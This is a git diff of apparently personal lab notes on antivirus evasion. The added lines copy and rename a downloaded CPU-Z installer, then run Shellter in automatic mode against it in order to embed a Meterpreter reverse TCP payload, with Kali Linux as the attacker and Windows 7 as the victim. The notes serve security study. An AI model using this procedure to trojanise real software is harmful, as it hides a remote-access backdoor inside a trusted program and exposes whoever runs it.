@@ -7,15 +7,22 @@ Using Kali Linux for attacking and Windows 7 as a Victim
 **Set-up:**  
 - Install shellter and wine 32 on Kali Linux.
 - Install cupz on Kali Linux so we can add a meterpreter reverse tcp payload in it.
-- 
 
-**Commands/Tools practiced:**  
+**Managing the downloaded file :** 
 ```
-# put exact commands here
+cd Desktop
+mkdir av-bypass
+cp /home/kali/Downloads/cpu-z_1.96-en.exe av-bypass
+cd av-bypass
+ls
+mv cpu-z_1.96-en.exe cpuz.exe
+ls
 ```
 
-**What worked / didn't:**  
-- 
+**Adding the payload:**
+```
+sudo shellter
+A (automatic)
+PE target: /home/kali/Desktop/av-bypass/cpuz.exe
 
-**Next step for tomorrow:**  
-- 
+```
